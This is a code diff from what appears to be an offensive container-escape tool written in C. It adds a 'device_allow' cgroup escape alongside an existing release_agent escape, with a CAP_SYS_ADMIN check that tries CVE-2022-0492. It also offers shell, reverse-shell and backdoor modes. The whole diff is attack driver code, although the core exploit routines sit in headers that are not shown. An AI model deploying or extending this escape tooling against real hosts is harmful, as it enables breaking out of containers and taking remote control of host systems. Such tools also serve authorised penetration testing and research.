@@ -16,8 +16,21 @@
 #include <stdio.h>
 
 #include "docker/cgroup.h"
+#include "exploits/devices_allow.h"
 
 #define DEFAULT_INPUT_BUFFER_SIZE 1024
+
+void cap_sys_admin_check() {
+    int sys_admin = check_cap_sys_admin();
+    if (sys_admin == 0) {
+        printf_wrapper(INFO, "Try to use CVE-2022-0492 to get CAP_SYS_ADMIN\n");
+        int result = cve_2022_0294();
+        if (result == 0) {
+            printf_wrapper(INFO, "No CAP_SYS_ADMIN capability, unable to escape through release_agent\n");
+            exit(EXIT_SUCCESS);
+        }
+    }
+}
 
 
 int main(int argc, char *argv[]) {
@@ -60,28 +73,19 @@ int main(int argc, char *argv[]) {
             case 'r':
                 attack_info.attack_type = RELEASE_AGENT;
                 break;
+            case 'd':
+                attack_info.attack_type = DEVICE_ALLOW;
+                break;
             case 'c':
                 attack_info.command = optarg;
                 break;
             case 'm':
                 if (strcmp(optarg, "exec") == 0) {
                     attack_info.attack_mode = EXEC;
-                    if (output_bash_warning("release_agent", "exec") != 0) {
-                        printf_wrapper(INFO, "Exit\n");
-                        exit(EXIT_SUCCESS);
-                    }
                 } else if (strcmp(optarg, "shell") == 0) {
                     attack_info.attack_mode = SHELL;
-                    if (output_bash_warning("release_agent", "shell") != 0) {
-                        printf_wrapper(INFO, "Exit\n");
-                        exit(EXIT_SUCCESS);
-                    }
                 } else if (strcmp(optarg, "reverse") == 0) {
                     attack_info.attack_mode = REVERSE;
-                    if (output_bash_warning("release_agent", "reverse") != 0) {
-                        printf_wrapper(INFO, "Exit\n");
-                        exit(EXIT_SUCCESS);
-                    }
                 } else if (strcmp(optarg, "backdoor") == 0) {
                     attack_info.attack_mode = BACKDOOR;
                 } else {
@@ -103,7 +107,19 @@ int main(int argc, char *argv[]) {
 //                break;
         }
     }
-
+    if (attack_info.attack_type == RELEASE_AGENT) {
+        if (attack_info.attack_mode == EXEC) {
+            output_bash_warning("release_agent", "exec");
+        } else if (attack_info.attack_mode == SHELL) {
+            output_bash_warning("release_agent", "shell");
+        } else if (attack_info.attack_mode == REVERSE) {
+            output_bash_warning("release_agent", "reverse");
+        }
+    } else if (attack_info.attack_type == DEVICE_ALLOW) {
+        if (attack_info.attack_mode == REVERSE) {
+            output_bash_warning("device_allow", "reverse");
+        }
+    }
     if (attack_info.attack_type == -1 || attack_info.attack_mode == -1) {
         printf_wrapper(ERROR, "Args set error, args of escape and -m must set\n");
         exit(EXIT_SUCCESS);
@@ -133,16 +149,7 @@ int main(int argc, char *argv[]) {
 
     switch (attack_info.attack_type) {
         case RELEASE_AGENT: {
-            int sys_admin = check_cap_sys_admin();
-            if (sys_admin == 0) {
-                printf_wrapper(INFO, "Try to use CVE-2022-0492 to get CAP_SYS_ADMIN\n");
-                int result = cve_2022_0294();
-                if (result == 0) {
-                    printf_wrapper(INFO, "No CAP_SYS_ADMIN capability, unable to escape through release_agent\n");
-                    exit(EXIT_SUCCESS);
-                }
-            }
-
+            cap_sys_admin_check();
             printf_wrapper(INFO, "Try to get container path in host\n");
             char *container_path_in_host = (char *) malloc(1024 * sizeof(char));
             memset(container_path_in_host, 0x00, 1024);
@@ -169,7 +176,6 @@ int main(int argc, char *argv[]) {
 
                 char *inputBuffer = malloc(sizeof(char) * DEFAULT_INPUT_BUFFER_SIZE);
                 memset(inputBuffer, 0x00, DEFAULT_INPUT_BUFFER_SIZE);
-                fgets(inputBuffer, DEFAULT_INPUT_BUFFER_SIZE, stdin);
                 while (strcmp(inputBuffer, "quit") != 0) {
                     printf("# ");
                     fgets(inputBuffer, DEFAULT_INPUT_BUFFER_SIZE, stdin);
@@ -199,6 +205,23 @@ int main(int argc, char *argv[]) {
             }
             free(container_path_in_host);
             break;
+        }
+        case DEVICE_ALLOW: {
+            cap_sys_admin_check();
+            if (attack_info.attack_mode == EXEC) {
+                printf_wrapper(ERROR, "Escape by device_allow not support exec mode\n");
+                exit(EXIT_SUCCESS);
+            } else if (attack_info.attack_mode == SHELL) {
+                device_allow_attack_info.cgroup_id = malloc(512 * sizeof(char));
+                strcpy(device_allow_attack_info.cgroup_id, cgroup_id);
+                escape_by_device_allow();
+                device_allow_shell();
+            } else if (attack_info.attack_mode == REVERSE) {
+                device_allow_attack_info.cgroup_id = malloc(512 * sizeof(char));
+                strcpy(device_allow_attack_info.cgroup_id, cgroup_id);
+                escape_by_device_allow();
+                device_allow_reverse();
+            }
         }
     }
 }
